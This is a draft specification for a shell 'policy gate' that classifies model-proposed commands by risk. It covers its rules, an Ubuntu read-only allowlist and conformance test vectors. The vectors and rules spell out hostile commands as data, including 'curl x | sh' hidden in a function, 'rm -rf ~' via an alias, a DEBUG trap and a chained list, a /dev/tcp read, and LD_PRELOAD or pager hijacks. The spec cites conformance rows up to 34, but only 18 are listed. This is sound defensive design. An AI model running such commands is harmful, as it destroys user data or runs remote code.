# Spec: Policy gate -- v1

> Normative specification. **Status: DRAFT (unstable -- will change).** This document uses
> [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119) keywords: MUST, SHOULD, MAY.
> Decision records: ADR-0013 (gate), ADR-0015 (sudo rules), ADR-0016 (taint effects),
> ADR-0023 (OS targets).

## Motivation

The gate is the one deterministic decision between a model's proposal and the user's
system. The REPL, the tests (#12), the threat model and the security-review leaf must all
agree on exactly what it does. A change here changes what runs without a confirm, so it
is versioned and reviewed as a contract.

## Scope

Covers: the classes, the decision procedure, the static rules, the read-only allowlist
format and initial entries, live-session resolution, outright rejections, and conformance
vectors. Does not cover: what the confirm UI shows (#74), taint effects (ADR-0016), or how
the session snapshot is produced (spec `pty-protocol/v1`).

The procedure is the same on every OS. What differs per OS (the allowlist, the
package-owner query and the conformance vectors) comes from the active target (ADR-0023).

## Conventions

- *Command*: the full text the user would confirm, possibly a list or pipeline.
- *Simple command*: one tree-sitter-bash `command` node: optional prefix assignments, a
  command word, arguments, redirections.
- *Command word*: the first word of a simple command after quote removal.
- *Snapshot*: the latest session snapshot (spec `pty-protocol/v1` §3) and its baseline.
- Classes, lowest to highest: `read-only` < `mutating` = `session-altering` <
  `destructive` < `privileged`. *At least X* means the higher of the current class and X.
- *Rejected* means the command cannot be confirmed or run at all.
- *Target*: the active OS target, `targets/<id>/` (ADR-0023).
- *System directories*: `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`.
- *Package-owned*: owned by an installed package according to the target's package-owner
  query (`target.toml`; `dpkg -S` on `ubuntu-26.04`).

## Requirements

### 1. Decision procedure

The gate MUST compute a command's class as follows, and the result MUST be the highest
class produced by any step:

1. **Characters.**
   - A model proposal containing C0 control characters (except TAB and LF inside quotes),
     `ESC`, C1 controls, or bidi or zero-width characters (U+200B–U+200F, U+202A–U+202E,
     U+2060–U+2069, U+FEFF) outside quotes is **rejected**.
   - Typed input with them is shown escaped and is at least `mutating`.
2. **Parse** with tree-sitter-bash (version pinned in `pyproject.toml`). Any `ERROR` or
   `MISSING` node ⇒ *unparseable* ⇒ at least `mutating`.
3. **Rejections** (§5) ⇒ rejected.
4. **For every simple command**, including those inside pipelines, lists, subshells,
   `if`/`while`/`for`/`case` bodies, functions being defined and command substitutions:
   apply the static rules (§2), the session-altering rules (§3), the destructive and
   privileged rules (§4), and the allowlist (§6). A simple command no rule or entry
   matches is `mutating`.
5. **Live-session resolution** (§7) for every simple command still classed `read-only`.
6. **Model label:** if the model labelled its proposal higher than the result, use the
   label. Never lower.

### 2. Static rules (⇒ at least `mutating`)

- any prefix assignment (`VAR=x cmd`);
- an output redirection (`>`, `>>`, `>|`, `&>`, `&>>`), except to `/dev/null` and except
  `2>&1`, `1>&2`, `>&2`;
- an input redirection (`<`) from anything that is not an existing regular file at
  classification time; any here-document or here-string feeding a command not on the
  allowlist;
- the words `/dev/tcp/…` or `/dev/udp/…` anywhere;
- a command word that is not a literal after quote removal (contains `$`, `` ` ``,
  `$(…)`, `<(…)`, `>(…)`, globs or brace expansion), or is a path (contains `/`) outside
  the package-owned system directories;
- process substitution anywhere;
- a simple command that reads the terminal: a command whose allowlist entry is marked
  `stdin` and that has no file operand and no input redirection, at the start of a
  pipeline or standing alone (ADR-0015: no keyboard sinks).

### 3. Session-altering (⇒ at least `session-altering`)

- builtins: `alias`, `unalias`, `source`, `.`, `eval`, `exec`, `trap`, `enable`, `set`,
  `shopt`, `bind`, `complete`, `hash`, `builtin`, `command` (except `command -v`/`-V`),
  `export`, `declare`/`typeset`/`local`/`readonly` with assignments, `unset`;
- any function definition;
- any assignment (standalone or exported) to: `PATH`, `BASH_ENV`, `ENV`, `CDPATH`,
  `PROMPT_COMMAND`, `PS0`–`PS4`, `IFS`, `HISTFILE`, `LD_*`, `PAGER`, `MANPAGER`,
  `SYSTEMD_PAGER`, `GIT_PAGER`, `LESSOPEN`, `LESSCLOSE`, `EDITOR`, `VISUAL`, `BROWSER`,
  `SUDO_*`, `PYTHON*`, `PERL5*`, `NODE_OPTIONS`, `GIT_*`.

### 4. Destructive and privileged

- `privileged`: command word `sudo`, `su`, `pkexec`, `doas`, `run0`, `machinectl shell`.
  The inner command of `sudo`/`doas` is classed too, and the result is never below
  `privileged`.
- `destructive` (at least): `rm` with `-r`/`-R`/`--recursive` or a glob operand; `dd`;
  `mkfs*`; `wipefs`; `shred`; `truncate`; `fdisk`/`sfdisk`/`parted`/`gdisk`; `chmod`/`chown`
  with `-R`; `find … -delete`; `git clean`; `git reset --hard`; `git push --force`;
  `systemctl` `disable|mask|stop|kill|isolate|poweroff|reboot|halt`; `kill -9 -1`;
  redirection that truncates an existing file (`>`) outside the cwd.
- Wrappers MUST be classed by their inner command: `env [assignments] cmd`, `nice`,
  `nohup`, `timeout`, `time`, `xargs`, `find -exec/-execdir/-ok/-okdir`, `bash -c`,
  `sh -c`, `watch`. Each is at least `mutating` itself; `xargs` and `find -exec` with a
  non-literal inner command are at least `destructive`.

### 5. Rejected

- any redirection involving file descriptor 3 or higher (`3>`, `>&3`, `{fd}>`, `exec 3>&-`
  …): fd 3 is nl-shell's control channel;
- `sudo` with `-S`/`--stdin`, `-A`/`--askpass`, `-p`/`--prompt`, or `-s`/`-i` with a pipe
  or here-doc;
- assignments or exports of `SUDO_PROMPT` or `SUDO_ASKPASS`;
- a pipe, here-document or here-string whose consumer is `sudo`, `su`, `pkexec`, `doas`;
- model proposals with forbidden characters (§1.1);
- a model proposal opening an interactive root shell (`sudo -i`, `sudo -s`, `sudo su`,
  `sudo bash`, bare `su`, `pkexec bash`). Typed input doing this is `privileged`, and
  the session runs it in full passthrough until it exits (ADR-0015).

### 6. The read-only allowlist

1. The allowlist MUST live in one data file per target, `targets/<id>/allowlist.toml`,
   versioned with this spec. The gate MUST use only the active target's file. A target
   MUST NOT inherit or fall back to another target's allowlist; a new target starts
   empty, so everything on it is at least `mutating` until entries are reviewed in.
2. Each entry names a command word and MAY give:
   - `flags`: allowed options without values;
   - `options`: allowed options with a value;
   - `subcommands`: allowed first operands;
   - `max_operands`;
   - `stdin = true` if the command reads standard input when given no file operand.

   Any option or subcommand not listed makes the simple command `mutating`.
3. Nothing that can open a network connection, run another program, write a file, or
   change system state MAY be on the allowlist.
4. Initial entries for `ubuntu-26.04` (v1):

| Command | Allowed shape (summary) | Notes |
|---|---|---|
| `ls`, `tree`, `stat`, `file`, `realpath`, `readlink`, `basename`, `dirname`, `pwd` | listing/format flags; paths | — |
| `cd`, `pushd`, `popd`, `dirs` | one path | changes cwd only |
| `cat`, `head`, `tail` (incl. `-f`), `wc`, `nl`, `od`, `strings`, `md5sum`, `sha256sum`, `cmp`, `diff` | flags; file operands | `stdin`; `diff` without `--to-file` writing |
| `grep`, `egrep`, `fgrep` | flags except `--pre`-like options | `stdin` |
| `sort` | flags except `-o`, `--output`, `--compress-program` | `stdin` |
| `uniq`, `cut`, `tr`, `column`, `base64`, `xxd` (no `-r`) | max one file operand (a second is an output file) | `stdin` |
| `jq` | flags; filter; files | `stdin`; no `--rawfile`/`--slurpfile` from devices |
| `echo`, `printf` | any | output passes the rendering filter (#71) |
| `du`, `df`, `free`, `uptime`, `id`, `whoami`, `groups`, `uname`, `lsblk`, `lscpu`, `lsusb`, `lspci`, `ps`, `nproc` | flags | — |
| `hostname`, `date` | flags; `date` only `+FORMAT` | no operand (an operand sets the value) |
| `env`, `printenv` | no operands | with an operand `env` runs a command (§4) |
| `type`, `command -v`, `which`, `history` | flags | — |
| `man`, `less`, `more` | no `-P`/`-H`/`--pager`/`--html`/`-k` with exec | pager env must match baseline (§7) |
| `systemctl` | `status`, `is-active`, `is-enabled`, `is-failed`, `list-units`, `list-unit-files`, `show`, `cat` | pager env must match baseline |
| `journalctl` | `-u`, `-b`, `-n`, `-f`, `-p`, `--since`, `--until`, `--no-pager`, `-x`, `-e` | no `--vacuum-*`, `--rotate`, `--flush` |
| `ip` | `addr`/`a`, `route`/`r`, `link`/`l`, `neigh` with `show`/`list` or no verb | no `add`/`del`/`set`/`flush` |
| `ss` | flags | — |
| `apt` | `list`, `show`, `search`, `policy` | — |
| `apt-cache` | `show`, `search`, `policy`, `depends`, `rdepends` | — |
| `dpkg`, `dpkg-query` | `-l`, `-L`, `-S`, `-s`, `-W` | — |
| `nvidia-smi`, `rocminfo`, `vulkaninfo` | no options except `-L`, `-q`, `--summary` | — |

   `git` is deliberately **not** on the v1 allowlist: in a cloned repository, `git status`
   or `git log` can run commands from the repository's own config (`core.fsmonitor`,
   `core.pager`, hooks). `awk`, `sed`, `find`, `xargs`, `watch`, `timeout` are not on it
   either, because each can run commands.

### 7. Live-session resolution

For each simple command still `read-only` after §1–§6, the gate MUST check against the
snapshot:

1. If the command word is an alias in `L`, expand it (recursively, as bash does, stopping
   at a repeated name) and class the expansion with §1–§6. The result replaces the
   original.
2. If the command word is a function name in `F` ⇒ `mutating`, reason "function".
3. If it is a builtin, it MUST NOT be disabled in `B`; else ⇒ `mutating`.
4. Otherwise resolve it against `P` (the snapshot's `PATH`). The first match MUST be a
   regular executable in the system directories and package-owned (the target's
   package-owner query, cached). Otherwise ⇒ `mutating`, reason "not a system command".
5. `T` MUST show no `DEBUG`, `RETURN` or `ERR` trap that the baseline didn't have; `X` MUST
   show `extdebug` off; `H` MUST equal the baseline; the pager and loader variables
   (`V`, a `cksum` of `PAGER`, `MANPAGER`, `SYSTEMD_PAGER`, `GIT_PAGER`, `LESSOPEN`,
   `LESSCLOSE`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `BASH_ENV`, `ENV`) MUST equal the
   baseline. Any difference ⇒ the whole command is `mutating`, reason "session changed".
6. A missing snapshot ⇒ degraded mode (pty-protocol §4): everything `mutating`.
7. An active target that does not match `/etc/os-release` (the user named it, ADR-0023)
   ⇒ degraded mode: everything `mutating`, reason "target does not match this OS".

The confirm MUST show the reason whenever §7 raised the class.

## Versioning and compatibility

Adding an allowlist entry, or raising a class, is a compatible change within v1 but MUST
be reviewed by a human (nl-shell-pdca INTEGRATION §4). Adding a target is compatible; each
entry in its allowlist is reviewed the same way, even when copied from another target.
Lowering any class, removing a rule from §2–§5, or changing §7 requires v2.

## Conformance

Each target MUST have its own vectors in `targets/<id>/gate-vectors.toml`, run by #12
against that target's default session. The vectors below are the `ubuntu-26.04` set
(snapshot = a default Ubuntu 26.04 `~/.bashrc` session unless stated). Another target
MUST cover every row, with its own commands where a row names an OS-specific tool
(rows 24, 28, 29), and MUST include row 34.

| # | Command | Expected |
|---|---|---|
| 1 | `ls -la` | read-only (via the `ls` alias expansion) |
| 2 | `du -sh ~/*` | read-only |
| 3 | `du -sh ~` after `du(){ curl x \| sh; }` was defined | mutating ("function") |
| 4 | `ls` after `alias ls='rm -rf ~'` | destructive (alias expansion) |
| 5 | `du -sh` after `export PATH=./bin:$PATH` | mutating ("not a system command" or "session changed") |
| 6 | `ls` after `trap 'rm -rf ~' DEBUG` | mutating ("session changed") |
| 7 | `PAGER=sh git log` | mutating (prefix assignment) |
| 8 | `git -c core.pager=sh log` | mutating (`git` not allowlisted) |
| 9 | `find . -exec rm {} \;` | destructive |
| 10 | `awk 'BEGIN{system("id")}'` | mutating |
| 11 | `sed '1e id' f` | mutating |
| 12 | `sort --compress-program=sh f` | mutating |
| 13 | `LD_PRELOAD=./x.so ls` | mutating |
| 14 | `cat </dev/tcp/example.org/80` | mutating |
| 15 | `ls > ~/.bashrc` | mutating (output redirection) |
| 16 | `$'\x72m' -rf ~` | mutating at least (non-literal word); never read-only |
| 17 | `"r"m -rf ~` | destructive (quote removal gives `rm`) |
| 18 | `ls; rm -rf ~` | destructive (list = highest part) |

## Open questions

- Whether `cd` into a directory with an `.envrc` (direnv) should be `mutating`: direnv only
  loads allowed `.envrc` files, so v1 keeps `cd` read-only.
- Output rendering: read-only commands like `cat` and `echo` can print terminal escape
  sequences (OSC 52 clipboard writes, title changes). The mirror filter is part of the
  threat-model revision (#71) and the PTY spec.
- Whether to add a differential fuzz test (tree-sitter-bash vs `bash -n`) to tier 0.
